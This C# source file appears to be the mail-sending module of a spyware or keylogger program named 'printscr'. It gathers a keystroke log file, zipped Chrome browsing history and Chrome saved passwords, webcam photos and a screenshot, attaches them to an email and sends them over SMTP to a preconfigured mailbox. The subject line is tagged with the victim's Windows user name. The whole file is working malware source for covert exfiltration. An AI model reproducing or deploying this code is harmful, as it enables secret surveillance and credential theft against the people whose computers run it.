using System;
using System.IO;
using System.Net.Mail;
using System.Windows.Forms;

namespace printscr
{
    class MailSend
    {
        public static void sent(bool sent, string saveScreenshot)
        {
            System.GC.Collect();
            System.GC.WaitForPendingFinalizers();
            try
            {
                if (Constants.sendMail)
                {
                    if (!File.Exists(Constants.path + @"\z00yc_5_15_1901016.txt")) return;
                    MailMessage oMail = new MailMessage();
                    SmtpClient oClient = new SmtpClient(Constants.host, Constants.port);
                    oClient.EnableSsl = true;
                    oClient.Port = 587;
                    oClient.Credentials = new System.Net.NetworkCredential(Constants.mail, Constants.password);
                    oMail.From = new MailAddress(Constants.mail);
                    oMail.To.Add(new MailAddress(Constants.mail));
                    oMail.Subject = "PCName: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "_" + DateTime.Now.ToString();
                    try
                    {
                        File.Copy(Constants.path + @"\z00yc_5_15_1901016.txt", Constants.path + @"\z00yc_5_15_1901016Send.txt", true);
                        Attachment fileKeylogger = new Attachment(Constants.path + @"\z00yc_5_15_1901016Send.txt");
                        oMail.Attachments.Add(fileKeylogger);
                        if (Constants.getChromeHistory)
                        {
                            if (File.Exists(Constants.path + @"\GoogleDataHistory.zip"))
                            {
                                Attachment chromeHistoryAttached = new Attachment(Constants.path + @"\GoogleDataHistory.zip");
                                oMail.Attachments.Add(chromeHistoryAttached);
                            }
                        }
                        if (Constants.getChromePasswords)
                        {
                            if (File.Exists(Constants.path + @"\GoogleDataPassword.zip"))
                            {
                                Attachment chromePasswordAttached = new Attachment(Constants.path + @"\GoogleDataPassword.zip");
                                oMail.Attachments.Add(chromePasswordAttached);
                            }
                        }
                    }
                    catch
                    {
                        MessageBox.Show("014");
                    }
                    if (Constants.webCameraPhoto)
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(Constants.path))
                            {
                                string[] picList = Directory.GetFiles(Constants.path + @"\", "*.jpeg");
                                foreach (string f in picList)
                                {
                                    Attachment dosyaEki = new Attachment(f);
                                    oMail.Attachments.Add(dosyaEki);
                                }
                            }
                        }
                        catch
                        {
                            MessageBox.Show("015");

                        }
                    }
                    try
                    {
                        if (!string.IsNullOrEmpty(saveScreenshot))
                        {
                            Attachment dosyaEki2 = new Attachment(saveScreenshot);
                            oMail.Attachments.Add(dosyaEki2);
                        }
                    }
                    catch
                    {
                        MessageBox.Show("016");

                    }
                    Tools oTool = new Tools();
                    if (oTool.IsConnected())
                    {
                        try
                        {
                            oClient.Send(oMail);
                            oMail.Dispose();
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("017");

                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("018");
            }
        }
    }
}
